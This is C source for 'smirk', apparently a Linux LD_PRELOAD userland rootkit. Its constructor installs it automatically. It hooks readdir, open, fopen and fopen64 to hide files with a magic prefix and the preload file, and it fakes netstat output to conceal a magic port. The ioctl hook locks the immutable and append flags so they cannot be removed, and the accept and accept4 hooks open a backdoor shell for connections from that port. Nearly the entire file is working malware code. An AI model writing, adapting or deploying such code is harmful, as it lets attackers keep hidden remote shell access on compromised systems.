#include "smirk.h"
#include "utils.h"

/*
 * Function:  init
 * --------------------
 * the constructor checks if exists the killswitch and uninstall the rootkit
 * if there isn't a killswitch file it try to install smirk
 *
 *  returns: nothing
 */
void __attribute ((constructor))
init(void)
{
    #ifdef DEBUG
    printf("[-] constructor\n");
    #endif
    #ifdef KILLSWITCH
    struct stat buffer;
    if (stat(KILLSWITCH, &buffer) == 0){
        #ifdef DEBUG
        printf("[!] killswitch found!\n");
        #endif
        uninstall();
    } else{
        install();
    }
    #else
    install();
    #endif
}

/*
 * Function:  end
 * --------------------
 * just en empty distructor for debug purposes
 * that rug really tied the room together, did it not? :D B.L.
 *
 *  returns: nothing
 */
__attribute__((destructor))
void end (void) {
    #ifdef DEBUG
    printf("\n[-] destructor\n");
    #endif
}

/*
 * Function:  load_libc
 * --------------------
 * dynamically load libc and the specified function
 *
 *  funcname: the function to load
 *
 *  returns: the pointer to the libc function and stores on global "libc" the libc library
 */
void *load_libc(char *funcname){
    if (!libc) {
        libc=dlopen(LIBC, RTLD_LAZY);
    }
    return dlsym(libc, funcname);
}

/*
 * Function:  readdir
 * --------------------
 * readdir hijacking
 * if it find ls.so.preload or a file that starts with MAGIC_PREFIX omits it and clean output
 */
struct dirent *readdir(DIR *dirp)
{
    #ifdef DEBUG
    printf("[-] hooking readdir\n");
    #endif

    if(!hooked_readdir){
        hooked_readdir = load_libc("readdir");
    }

    struct dirent *dir;
    dir = hooked_readdir(dirp);
    
    if(dir == NULL){
        return NULL;
    }

    char filename[PATH_MAX];
    int fn_size;

    // take the filename and removes garbage chars after \0
    for (fn_size = 0; dir->d_name[fn_size] != '\0'; fn_size++){
        filename[fn_size] = dir->d_name[fn_size];
    }
    filename[fn_size] = '\0';
    
    if(is_magicfile(filename)){
        #ifdef DEBUG
        printf("[+] Hiding %s\n",filename);
        #endif
        // clean the string
        for (int x = 0; x <= fn_size; x++){
            dir->d_name[x] = '\0';
        }
        return readdir(dirp);
    }

    return dir;
}

/*
 * Function:  open
 * --------------------
 * open hijacking
 * if it's a network file (netstat case) it filter values with MAGIC_PORT
 * if the file name contains magic prefix it return "file doesn't exists"
 */
int open(const char *pathname, int flags, mode_t mode){
    #ifdef DEBUG
    printf("[-] hooking open\n");
    #endif

    if(!hooked_open){
        hooked_open = load_libc("open");
    }

    char real_pathname[PATH_MAX];
    realpath(pathname,real_pathname);

    // netstat case: hide ports
    if (is_net_file(real_pathname)){
        char newfile[PATH_MAX];
        if (!fake_netstat(real_pathname, newfile)){
            return -1;
        }
        return hooked_open(newfile, flags, mode);
    }

    // killswitch case: don't touch
    #ifdef KILLSWITCH
    else if (strcmp(real_pathname, KILLSWITCH) == 0){
        return hooked_open(real_pathname, flags, mode);
    }
    #endif

    // file with magic prefix
    else if (is_magicfile(real_pathname)){
        errno = ENOENT;
        return -1;
    }

    return hooked_open(pathname, flags, mode);
}

/*
 * Function:  fopen
 * --------------------
 * fopen hijacking
 * if it's a network file (netstat case) it filter values with MAGIC_PORT
 * if the file name contains magic prefix it return "file doesn't exists"
 */
FILE *fopen(const char *pathname, const char *mode)
{
    #ifdef DEBUG
    printf("[-] hooking fopen\n");
    #endif

    if(!hooked_fopen){
        hooked_fopen = load_libc("fopen");
    }

    char real_pathname[PATH_MAX];
    realpath(pathname,real_pathname);

    // netstat case: hide ports
    if (is_net_file(real_pathname)){
        char newfile[PATH_MAX];
        if (!fake_netstat(real_pathname, newfile)){
            return NULL;
        }
        return hooked_fopen(newfile, mode);
    } 
    
    // file with magic prefix
    if (is_magicfile(real_pathname)){
        errno = ENOENT;
        return NULL;
    }

    return hooked_fopen(real_pathname, mode);
}

/*
 * Function:  fopen64
 * --------------------
 * fopen64 hijacking
 * if it's a network file (netstat case) it filter values with MAGIC_PORT
 * if the file name contains magic prefix it return "file doesn't exists"
 */
FILE *fopen64(const char *pathname, const char *mode)
{
    #ifdef DEBUG
    printf("[-] hooking fopen64\n");
    #endif

    if(!hooked_fopen64){
        hooked_fopen64 = load_libc("fopen64");
    }

    char real_pathname[PATH_MAX];
    realpath(pathname,real_pathname);

    // netstat case: hide ports
    if (is_net_file(real_pathname)){
        char newfile[PATH_MAX];
        if (!fake_netstat(real_pathname, newfile)){
            return NULL;
        }
        return hooked_fopen64(newfile, mode);
    }
    
    // file with magic prefix
    if (is_magicfile(real_pathname)){
        errno = ENOENT;
        return NULL;
    }
 
    return hooked_fopen64(real_pathname, mode);
}

/*
 * Function:  is_flag_set
 * --------------------
 * check if the file pointed from fd has the "flags" setted or not 
 *
 *  fd: the file descriptor
 *  flags: the flags to compare
 *
 *  returns: 1 if file flags are set as flags, otherwise 0
 */
int is_flag_set(int fd, unsigned long flags){
    unsigned long argp;

    if(!hooked_ioctl){
        hooked_ioctl = load_libc("ioctl");
    }

    int flag_request = hooked_ioctl(fd, FS_IOC_GETFLAGS, &argp);
    if (flag_request != -1){
        argp = argp & flags;
        if (argp){
            return argp == flags;
        }
        return 0;
    }
    return 0;
}

/*
 * Function:  ioctl
 * --------------------
 * ioctl hijacking
 * if file has flags immutable and append are setted, it's avoid the possibiity to remove them
 * and it doesn't return them on GETFLAGS request
 */
int ioctl(int fd, unsigned long request, unsigned long *argp){
    #ifdef DEBUG
    printf("[-] hooking ioctl\n");
    #endif

    if(!hooked_ioctl){
        hooked_ioctl = load_libc("ioctl");
    }

    // +ia: immutable, append
    unsigned long flags = FS_IMMUTABLE_FL | FS_APPEND_FL;
    if (is_flag_set(fd, flags)){
        if (request == FS_IOC_SETFLAGS){
            *argp = *argp | flags;
            return hooked_ioctl(fd, request, argp);
        } else if (request == FS_IOC_GETFLAGS){
            int rc = hooked_ioctl(fd, request, argp);
            *argp = *argp &~ flags;
            return rc;
        }
    }

    return hooked_ioctl(fd, request, argp);
}

/*
 * Function:  accept4
 * --------------------
 * accept4 hijacking
 * if connection come from MAGIC_PORT it spawn a shell and redirect output to it
 */
int accept4(int socket, struct sockaddr_in *address, socklen_t *address_len, int flags){
    #ifdef DEBUG
    printf("[-] hooking accept4\n");
    #endif

    if (!hooked_accept4){
        hooked_accept4 = load_libc("accept4");
    }
    int fd = hooked_accept4(socket, address, address_len, flags);
    if (fd == -1){
        return fd;
    }
    int port = (int) ntohs(address->sin_port);
    
    // if connection comes from magic port spawn a shell and redirect I/O
    if (port == MAGIC_PORT){
        #ifdef DEBUG
        printf("[+] port hooked: %d, %d\n", port, fd);
        #endif
        pthread_t thread;
        int *pfd = malloc(sizeof(*pfd));
        *pfd = fd;
        pthread_create(&thread, NULL, backdoor, pfd);
        return accept4(socket, address, address_len, flags);
    }
    return fd;
}

/*
 * Function:  accept
 * --------------------
 * accept hijacking
 * if connection come from MAGIC_PORT it spawn a shell and redirect output to it
 */
int accept(int socket, struct sockaddr_in *address, socklen_t *address_len){
    #ifdef DEBUG
    printf("[-] hooking accept\n");
    #endif

    if (!hooked_accept){
        hooked_accept = load_libc("accept");
    }
    int fd = hooked_accept(socket, address, address_len);
    if (fd == -1){
        return fd;
    }
    int port = (int) ntohs(address->sin_port);
    
    // if connection comes from magic port spawn a shell and redirect I/O
    if (port == MAGIC_PORT){
        #ifdef DEBUG
        printf("[+] port hooked: %d, %d\n", port, fd);
        #endif
        pthread_t thread;
        int *pfd = malloc(sizeof(*pfd));
        *pfd = fd;
        pthread_create(&thread, NULL, backdoor, pfd);
        return accept(socket, address, address_len);
    }
    return fd;
}
